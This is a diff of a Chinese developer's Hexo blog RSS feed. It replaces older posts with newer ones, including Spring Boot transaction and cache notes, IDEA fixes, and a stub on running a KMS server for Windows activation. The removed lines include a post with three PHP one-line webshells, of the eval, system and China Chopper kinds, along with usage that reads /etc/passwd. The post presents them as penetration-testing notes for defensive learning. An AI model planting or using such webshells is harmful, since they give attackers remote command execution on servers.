@@ -9,95 +9,95 @@
     <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>捕捉一只爱折腾的绯鞠</description>
-    <pubDate>Wed, 21 Oct 2020 12:42:56 GMT</pubDate>
+    <pubDate>Sat, 24 Oct 2020 12:02:23 GMT</pubDate>
     <generator>http://hexo.io/</generator>
     
     <item>
-      <title>【笔记】IDEA创建多模块的SpringBoot项目</title>
-      <link>https://feiju12138.github.io/2020/10/21/IDEA%E5%88%9B%E5%BB%BA%E5%A4%9A%E6%A8%A1%E5%9D%97%E7%9A%84SpringBoot%E9%A1%B9%E7%9B%AE/</link>
-      <guid>https://feiju12138.github.io/2020/10/21/IDEA%E5%88%9B%E5%BB%BA%E5%A4%9A%E6%A8%A1%E5%9D%97%E7%9A%84SpringBoot%E9%A1%B9%E7%9B%AE/</guid>
-      <pubDate>Wed, 21 Oct 2020 12:33:41 GMT</pubDate>
+      <title>【笔记】搭建用于激活Windows的KMS服务器</title>
+      <link>https://feiju12138.github.io/2020/10/24/%E6%90%AD%E5%BB%BA%E7%94%A8%E4%BA%8E%E6%BF%80%E6%B4%BBWindows%E7%9A%84KMS%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
+      <guid>https://feiju12138.github.io/2020/10/24/%E6%90%AD%E5%BB%BA%E7%94%A8%E4%BA%8E%E6%BF%80%E6%B4%BBWindows%E7%9A%84KMS%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
+      <pubDate>Sat, 24 Oct 2020 11:16:45 GMT</pubDate>
       <description>
       
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;IDEA创建多模块的SpringBoot项目，通过Maven管理依赖实现模块间的依赖继承&lt;/p&gt;
+        
+        
+          &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
+        
       
       </description>
       
       
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>IDEA创建多模块的SpringBoot项目，通过Maven管理依赖实现模块间的依赖继承</p><a id="more"></a><h2 id="父模块"><a href="#父模块" class="headerlink" title="父模块"></a>父模块</h2><ul><li><p>创建一个SpringBoot项目，修改<code>pom.xml</code>文件</p></li><li><p>打包方式改为<code>pom</code></p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>将子模块加入到<code>&lt;modules&gt;&lt;/modules&gt;</code></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span>demo2<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><ul><li><p>右键父模块，在父模块上创建子模块，修改<code>pom.xml</code>文件</p></li><li><p>将<code>&lt;parent&gt;&lt;/parent&gt;</code>的<code>&lt;groupId&gt;&lt;/groupId&gt;</code>、<code>&lt;artifactId&gt;&lt;/artifactId&gt;</code>、<code>&lt;version&gt;&lt;/version&gt;</code>改为父模块的信息</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.cy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>father<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><ul><li>此时子模块会自动调用父模块的依赖</li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/lhw_csd/article/details/82183008" target="_blank" rel="noopener">CSDN——lhw_csd</a></p>]]></content:encoded>
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建用于激活Windows的KMS服务器，本教程以MacOS为例<br>另一台Windows或Windows虚拟机也可以作为搭建的服务器</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><code>vlmcsd</code></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/kkkgo/vlmcsd.git</span><br></pre></td></tr></table></figure><h2 id="搭建服务器"><a href="#搭建服务器" class="headerlink" title="搭建服务器"></a>搭建服务器</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vlmcsd/binaries/MacOSX/intel/</span><br></pre></td></tr></table></figure><h2 id="未完待更"><a href="#未完待更" class="headerlink" title="未完待更"></a>未完待更</h2>]]></content:encoded>
       
-      <comments>https://feiju12138.github.io/2020/10/21/IDEA%E5%88%9B%E5%BB%BA%E5%A4%9A%E6%A8%A1%E5%9D%97%E7%9A%84SpringBoot%E9%A1%B9%E7%9B%AE/#disqus_thread</comments>
+      <comments>https://feiju12138.github.io/2020/10/24/%E6%90%AD%E5%BB%BA%E7%94%A8%E4%BA%8E%E6%BF%80%E6%B4%BBWindows%E7%9A%84KMS%E6%9C%8D%E5%8A%A1%E5%99%A8/#disqus_thread</comments>
     </item>
     
     <item>
-      <title>【笔记】检验软件的md5值</title>
-      <link>https://feiju12138.github.io/2020/10/20/%E6%A3%80%E9%AA%8C%E8%BD%AF%E4%BB%B6%E7%9A%84md5%E5%80%BC/</link>
-      <guid>https://feiju12138.github.io/2020/10/20/%E6%A3%80%E9%AA%8C%E8%BD%AF%E4%BB%B6%E7%9A%84md5%E5%80%BC/</guid>
-      <pubDate>Tue, 20 Oct 2020 00:57:44 GMT</pubDate>
+      <title>【笔记】SpringBoot 事务处理</title>
+      <link>https://feiju12138.github.io/2020/10/24/SpringBoot%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86/</link>
+      <guid>https://feiju12138.github.io/2020/10/24/SpringBoot%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86/</guid>
+      <pubDate>Sat, 24 Oct 2020 10:23:46 GMT</pubDate>
       <description>
       
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;检验软件的md5值&lt;/li&gt;
-&lt;/ul&gt;
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;SpringBoot使用通过原声AOP实现事务处理&lt;/p&gt;
       
       </description>
       
       
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>检验软件的md5值</li></ul><a id="more"></a><h2 id="检验"><a href="#检验" class="headerlink" title="检验"></a>检验</h2><blockquote><p><code>&lt;file&gt;</code>：需要检验的文件</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5 &lt;file&gt;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.jianshu.com/p/2fdffc6aa056" target="_blank" rel="noopener">间书——wealon</a></p>]]></content:encoded>
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SpringBoot使用通过原声AOP实现事务处理</p><a id="more"></a><h2 id="事务处理"><a href="#事务处理" class="headerlink" title="事务处理"></a>事务处理</h2><ul><li>@Transactional注解描述的方法为事务切入点方法，这个方法在执行之前会开启事务，方法执行之后会提交或回滚事务。</li><li>可以描述类也可以描述方法，方法上事务特性优先级要高于类上定义的事务特性</li></ul><blockquote><p><code>readOnly</code>：定义线程安全，默认为false，true表示线程不安全。建议所有查询操作都将readOnly属性值改为true。<br><code>rollbackFor</code>：定义指定异常才会回滚，默认为RuntimeException。<br><code>noRollbackFor</code>：定义指定异常不回滚<br><code>timeout</code>：定义超时时间，默认为-1，表示不超时<br><code>isolation</code>：定义事务的隔离级别<br><code>propagation</code>：定义事务传播特性，默认<code>Propagation.REQUIRED</code></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span>(</span><br><span class="line">    readOnly = <span class="keyword">true</span>,</span><br><span class="line">    rollbackFor = RuntimeException<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">    <span class="title">noRollbackFor</span> </span>= RuntimeException<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">    <span class="title">timeout</span> </span>= -<span class="number">1</span>, isolation = Isolation.DEFAULT,</span><br><span class="line">    propagation = Propagation.REQUIRED</span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content:encoded>
       
-      <comments>https://feiju12138.github.io/2020/10/20/%E6%A3%80%E9%AA%8C%E8%BD%AF%E4%BB%B6%E7%9A%84md5%E5%80%BC/#disqus_thread</comments>
+      <comments>https://feiju12138.github.io/2020/10/24/SpringBoot%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86/#disqus_thread</comments>
     </item>
     
     <item>
-      <title>【笔记】删除Mac多余音频驱动</title>
-      <link>https://feiju12138.github.io/2020/10/19/%E5%88%A0%E9%99%A4Mac%E5%A4%9A%E4%BD%99%E9%9F%B3%E9%A2%91%E9%A9%B1%E5%8A%A8/</link>
-      <guid>https://feiju12138.github.io/2020/10/19/%E5%88%A0%E9%99%A4Mac%E5%A4%9A%E4%BD%99%E9%9F%B3%E9%A2%91%E9%A9%B1%E5%8A%A8/</guid>
-      <pubDate>Mon, 19 Oct 2020 14:58:16 GMT</pubDate>
+      <title>【笔记】SpringBoot Cache</title>
+      <link>https://feiju12138.github.io/2020/10/24/SpringBootCache/</link>
+      <guid>https://feiju12138.github.io/2020/10/24/SpringBootCache/</guid>
+      <pubDate>Sat, 24 Oct 2020 10:18:58 GMT</pubDate>
       <description>
       
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;删除Mac多余音频驱动&lt;/p&gt;
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;SpringBoot使用通过原生AOP实现的Cache&lt;/p&gt;
       
       </description>
       
       
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>删除Mac多余音频驱动</p><a id="more"></a><h2 id="删除驱动"><a href="#删除驱动" class="headerlink" title="删除驱动"></a>删除驱动</h2><ul><li>在以下目录删除对应名称的音频驱动，并重启电脑</li></ul><blockquote><p><code>/Library/Extensions/</code><br><code>/System/Library/Extensions/</code><br><code>/Library/Audio/Plug-Ins/HAL/</code></p></blockquote><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="http://www.jouypub.com/2019/931064f5e92818407afdee54bcaa57cc/" target="_blank" rel="noopener">JouyPub的博客</a></p>]]></content:encoded>
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SpringBoot使用通过原生AOP实现的Cache</p><a id="more"></a><h2 id="Cache"><a href="#Cache" class="headerlink" title="Cache"></a>Cache</h2><h3 id="为当前方法添加Cache"><a href="#为当前方法添加Cache" class="headerlink" title="为当前方法添加Cache"></a>为当前方法添加Cache</h3><blockquote><p><code>methodCache</code>：Cache名</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Cacheable</span>(<span class="string">"methodCache"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="启动清理缓存"><a href="#启动清理缓存" class="headerlink" title="启动清理缓存"></a>启动清理缓存</h3><blockquote><p><code>value</code>：清理的Cache名<br><code>allEntries</code>：清理全部内容<br><code>beforeInvocation</code>：清理时间在方法执行前</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CacheEvict</span>(value = <span class="string">"methodCache"</span>, allEntries = <span class="keyword">true</span>, beforeInvocation = <span class="keyword">true</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content:encoded>
       
-      <comments>https://feiju12138.github.io/2020/10/19/%E5%88%A0%E9%99%A4Mac%E5%A4%9A%E4%BD%99%E9%9F%B3%E9%A2%91%E9%A9%B1%E5%8A%A8/#disqus_thread</comments>
+      <comments>https://feiju12138.github.io/2020/10/24/SpringBootCache/#disqus_thread</comments>
     </item>
     
     <item>
-      <title>【笔记】上传Webshell木马脚本</title>
-      <link>https://feiju12138.github.io/2020/10/19/%E4%B8%8A%E4%BC%A0Webshell%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC/</link>
-      <guid>https://feiju12138.github.io/2020/10/19/%E4%B8%8A%E4%BC%A0Webshell%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC/</guid>
-      <pubDate>Mon, 19 Oct 2020 14:31:19 GMT</pubDate>
+      <title>【踩坑】Edit Start 报错：kotlin.KotlinNullPointerException</title>
+      <link>https://feiju12138.github.io/2020/10/23/EditStart%E6%8A%A5%E9%94%99%EF%BC%9Akotlin/</link>
+      <guid>https://feiju12138.github.io/2020/10/23/EditStart%E6%8A%A5%E9%94%99%EF%BC%9Akotlin/</guid>
+      <pubDate>Fri, 23 Oct 2020 02:54:35 GMT</pubDate>
       <description>
       
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上传Webshell木马脚本进行渗透测试&lt;/p&gt;
-&lt;p&gt;&lt;font color=&quot;red&quot;&gt;本文仅用于网络信息防御学习&lt;/font&gt;&lt;/p&gt;
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;IDEA的插件&lt;code&gt;Edit Start&lt;/code&gt;使用时报错：&lt;code&gt;kotlin.KotlinNullPointerException: null&lt;/code&gt;&lt;/p&gt;
       
       </description>
       
       
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上传Webshell木马脚本进行渗透测试</p><p><font color="red">本文仅用于网络信息防御学习</font></p><a id="more"></a><h2 id="php权限马"><a href="#php权限马" class="headerlink" title="php权限马"></a>php权限马</h2><ul><li>创建<code>.php</code>文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ul><li>原理：可以将变量cmd赋值，但是只能赋值php代码</li><li>地址栏访问时追加参数<code>?cmd=phpinfo()</code></li></ul><h2 id="shell权限马"><a href="#shell权限马" class="headerlink" title="shell权限马"></a>shell权限马</h2><ul><li>创建<code>.php</code>文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_REQUEST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><ul><li>原理：可以将变量cmd赋值，但是只能赋值shell代码</li><li>地址栏访问时追加参数<code>?cmd=cat /etc/passwd</code></li></ul><h2 id="中国菜刀马"><a href="#中国菜刀马" class="headerlink" title="中国菜刀马"></a>中国菜刀马</h2><blockquote><p><code>cmd</code>：作为使用中国菜刀时的密码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>配合中国菜刀进行渗透</li></ul><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1E4411L7zS" target="_blank" rel="noopener">哔哩哔哩——程序学习</a></p>]]></content:encoded>
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>IDEA的插件<code>Edit Start</code>使用时报错：<code>kotlin.KotlinNullPointerException: null</code></p><a id="more"></a><p><img src="/images/20201023105435/01.png" alt="01.png"></p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><ul><li>没有添加为Maven项目</li></ul><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><ul><li><p>将项目添加为Maven项目</p></li><li><p>右键项目中的<code>pom.xml</code>文件-&gt;<code>Add as Maven Project</code></p></li></ul><p><img src="/images/20201023105435/02.png" alt="02.png"></p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content:encoded>
       
-      <comments>https://feiju12138.github.io/2020/10/19/%E4%B8%8A%E4%BC%A0Webshell%E6%9C%A8%E9%A9%AC%E8%84%9A%E6%9C%AC/#disqus_thread</comments>
+      <comments>https://feiju12138.github.io/2020/10/23/EditStart%E6%8A%A5%E9%94%99%EF%BC%9Akotlin/#disqus_thread</comments>
     </item>
     
     <item>
-      <title>【笔记】java字符串转换为json对象</title>
-      <link>https://feiju12138.github.io/2020/10/19/java%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E4%B8%BAjson%E5%AF%B9%E8%B1%A1/</link>
-      <guid>https://feiju12138.github.io/2020/10/19/java%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E4%B8%BAjson%E5%AF%B9%E8%B1%A1/</guid>
-      <pubDate>Mon, 19 Oct 2020 11:30:35 GMT</pubDate>
+      <title>【踩坑】解决IDEA的Project窗口消失</title>
+      <link>https://feiju12138.github.io/2020/10/23/%E8%A7%A3%E5%86%B3IDEA%E7%9A%84Project%E7%AA%97%E5%8F%A3%E6%B6%88%E5%A4%B1/</link>
+      <guid>https://feiju12138.github.io/2020/10/23/%E8%A7%A3%E5%86%B3IDEA%E7%9A%84Project%E7%AA%97%E5%8F%A3%E6%B6%88%E5%A4%B1/</guid>
+      <pubDate>Fri, 23 Oct 2020 02:19:22 GMT</pubDate>
       <description>
       
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;java中将json格式的字符串通过Jackson对象提供的方法转换为json对象&lt;/p&gt;
+        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;解决IDEA的Project窗口消失&lt;/p&gt;
       
       </description>
       
       
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>java中将json格式的字符串通过Jackson对象提供的方法转换为json对象</p><a id="more"></a><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><blockquote><p><code>&lt;str&gt;</code>：json格式的字符串</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> ObjectMapper().writeValueAsString(&lt;str&gt;);</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content:encoded>
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>解决IDEA的Project窗口消失</p><a id="more"></a><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><ul><li><p>先关闭当前项目</p></li><li><p>在文件目录下删除<code>.idea</code>目录</p></li><li><p>用IDEA重新打开项目</p></li></ul><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/menglinjie/article/details/75215611" target="_blank" rel="noopener">CSDN——孟林洁</a></p>]]></content:encoded>
       
-      <comments>https://feiju12138.github.io/2020/10/19/java%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E4%B8%BAjson%E5%AF%B9%E8%B1%A1/#disqus_thread</comments>
+      <comments>https://feiju12138.github.io/2020/10/23/%E8%A7%A3%E5%86%B3IDEA%E7%9A%84Project%E7%AA%97%E5%8F%A3%E6%B6%88%E5%A4%B1/#disqus_thread</comments>
     </item>
     
   </channel>
